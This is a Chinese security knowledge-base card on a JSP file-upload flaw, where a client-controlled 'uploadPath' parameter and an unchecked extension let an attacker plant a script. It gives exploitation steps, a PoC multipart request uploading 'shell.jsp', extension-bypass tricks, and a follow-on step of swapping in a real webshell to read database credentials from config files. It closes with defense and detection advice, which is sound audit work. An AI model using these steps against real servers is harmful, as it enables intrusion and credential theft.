---
id: web-generic-file-upload-jsp-uploadpath-param-any-extension-timestamp-rename
title: JSP 上传接口的 uploadPath 由前端传参决定、后缀完全不校验，只做「时间戳+随机数」重命名：把 uploadPath 指到已知可写可访问目录即可落地脚本
type: scenario
domain: web
path: web/generic/file-upload
technique: jsp-upload-path-param-any-extension-timestamp-rename
tags:
- web
- file-upload
- jsp
- java
- unrestricted-upload
- path-parameter
- webshell
- audit
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:33:07+08:00'
  notes: 已对照原文核对；上传代码（extName 只截取不比较、时间戳+随机数重命名、new File(savePath+name+extName)、item.write、response 仅回文件名）、uploadPath 由前端传参、利用历史遗留目录落地等均与正文一致；本次核对未读取图片，仅依据正文；上传实际 HTTP 报文与访问路径出自截图，未验证
url: /docs/web/generic/file-upload/web-generic-file-upload-jsp-uploadpath-param-any-extension-timestamp-rename/
draft: false
kb_aliases:
- uploadPath 可控上传
- JSP 任意文件上传
- 后缀未校验 item.write
- 时间戳随机数重命名
- 只返回文件名不返回路径
- 修复不彻底二次挖洞
---

## 一句话结论

审计 JSP 上传点时，只看「有没有白名单校验」会漏掉更常见的一种：代码取前端传来的 `uploadPath` 当保存目录，`extName = name.substring(name.lastIndexOf("."))` 取完后缀根本不判断，直接用 `new File(savePath + 重命名 + extName)` 写盘；这时只要把 `uploadPath` 指到一个「已知存在、Web 可访问、进程可写」的目录（老站被渗透过留下的目录就是现成候选），随便传 `.jsp` 就能落地脚本，而响应只回显重命名后的文件名、不回路径，需要自己拼 URL 验证。

## 原理

- **保存目录来自客户端**：`uploadPath`/`savePath` 若由请求参数提供，攻击者就掌握了「文件写哪里」的决定权。这比后缀绕过更彻底——即使后缀白名单严格，写进可执行目录也一样能拿 shell；反过来后缀不校验时，路径可控就等于任意目录任意文件写。
- **后缀只截取不校验**：`extName = name.substring(name.lastIndexOf("."))` 是最常见的「看起来处理了后缀」的假校验——它只把后缀切出来，后面没有任何 `if (extName.equals(".jpg"))` 之类的比较，于是 `.jsp`、`.jspx`、`.war` 全部放行。
- **重命名挡不住利用**：`name + (int)(Math.random()*90000+10000)` 加时间戳只是让文件名不可预测，攻击者从响应里就能拿到新文件名（本例 `response.getWriter().print(name.trim() + extName.trim())`），随机化不构成防护。
- **响应不回路径是唯一障碍**：接口只回文件名，攻击者得自己知道落到了哪个目录。因此「先确认一个已存在且可访问的目录」是这条链的关键步骤；原文正是利用此前被上传过 shell 的遗留目录（`/aaa/bbbb/` 一类）作为落点，因为它必然存在、可写、且能通过 URL 访问。
- **为什么在「已修复过的系统」里还能挖到**：开发常按「哪个页面报过洞就修哪个页面」，同项目里其它上传点、或同一上传点的另一个参数（`uploadPath` 而非后缀）没被一起修。审计时应把「所有调用上传组件的入口」和「上传方法的全部参数」都过一遍。

## 触发条件

- 存在 JSP/Servlet 上传接口，保存目录由请求参数（`uploadPath`/`savePath`/`dir`/`path`）决定，或可从参数拼接。
- 后缀只做截取、未做白名单/黑名单比较；或组件（如 commons-fileupload 的 `item.write`）本身不限制类型。
- 目标目录可写且 Web 可访问（应用目录、静态资源目录、历史遗留上传目录、`ROOT` 下任意子目录）。
- 响应回显重命名后的文件名（或可预测命名规则），使攻击者能拼出访问 URL。

## 利用步骤

1. 定位上传接口与其参数：抓包看是否有 `uploadPath`/`savePath` 之类字段；审计源码确认它是否直接参与 `new File(...)` 拼接。
2. 确认后缀逻辑：搜索 `lastIndexOf(".")`、`getExtension`、`substring` 后是否有实际的类型判断；没有即任意后缀。
3. 找一个可写可访问的目录：优先「站点上已存在的目录」（能被正常访问的 `/upload/`、`/images/`、`/aaa/bbbb/` 等），避免猜不存在的路径导致创建失败或写入后不可访问。
4. 上传最小验证文件（如 `.jsp` 打印常量），从响应取回新文件名。
5. 用 `目录 + 新文件名` 拼 URL 访问，确认解析执行（不是被当静态下载）。
6. 换成实际 webshell 或内存马；随后用同权限读取 `WEB-INF/web.xml`、`web.config`、`application.properties` 等配置文件取数据库连接串。

## PoC

```text
POST /module/upload.jsp HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="uploadPath"

/aaa/bbbb/
------x
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.print("RCE_OK"); %>
------x--
```

响应（只回文件名，不回路径）：

```text
shell169999999912345.jsp
```

拼接访问：`GET /aaa/bbbb/shell169999999912345.jsp` → 返回 `RCE_OK` 即落地成功。

对应的脆弱代码形态：

```java
String uploadPath = request.getParameter("uploadPath");        // 目录可控
String extName = name.substring(name.lastIndexOf("."));        // 只截取，未校验
String newName = name + (int)(Math.random()*90000+10000);      // 随机化不防利用
File file = new File(savePath + newName + extName);            // 直接拼接
item.write(file);
response.getWriter().print((newName + extName).trim());        // 只回文件名
```

## 变体与关联

- 参数变体：`uploadPath`、`savePath`、`dir`、`filePath`、`webUploadpath`；有的从 Cookie/Header 取，有的先 base64 再解码。
- 绕过变体：后缀黑名单可用 `.jspx`、`.jspf`、`.jsp;.jpg`（IIS/Apache 解析差异）、大小写 `.JSP`、`%00` 截断（老 JDK）、`.war` 部署；后缀白名单则靠「路径可控写进可执行目录」或「配置文件覆盖」。
- 命名变体：时间戳+随机数可预测时可直接猜 URL；UUID 命名则必须依赖响应回显或目录列举。
- 关联：与「.NET 分片上传 filename 可控」的区别是那条控文件名、本条控目录；与「jeeWMS fileAddr 路径穿越」的区别是那条用 `../` 穿越、本条直接换绝对目录参数；与「小智平台仅取原始后缀」的区别是那条目录固定、只有后缀不受限，本条两个维度都失控。
- 关联：落地成功后取配置文件（`web.config` 的 `connectionString`、`application.properties` 的数据源）是常见的下一步——拿到数据库口令即可横向；与「web.config.bak 泄露」类卡互补（那条靠备份文件，本条靠已有 shell）。

## 检测与防御

- 保存目录由服务端配置决定，绝不接受客户端传参；如需分目录，用「目录 ID → 服务端映射」的白名单。
- 后缀白名单（只允许业务需要的类型）+ 内容类型校验（magic bytes）+ 重命名为无扩展名或固定扩展名 + 落地目录禁止脚本执行（Nginx `location` 禁 `jsp`/`php` 解析，Tomcat 侧目录不放可执行资源）。
- 上传目录与 Web 根分离，用独立域名/静态服务分发，且设置 `Content-Disposition: attachment`。
- 响应不要回显落盘文件名（或只回业务 ID），避免攻击者拼 URL。
- 审计视角：把「所有上传入口」与「上传方法的全部参数」列成清单一次性排查，不要按页面逐个修；对已修复系统重点回归「同组件其它调用点」。
- 检测：上传请求中出现 `uploadPath`/`savePath` 类参数、文件名后缀为脚本类型；Web 目录下新增脚本文件的 mtime 突变；对上传目录的脚本访问返回 200。
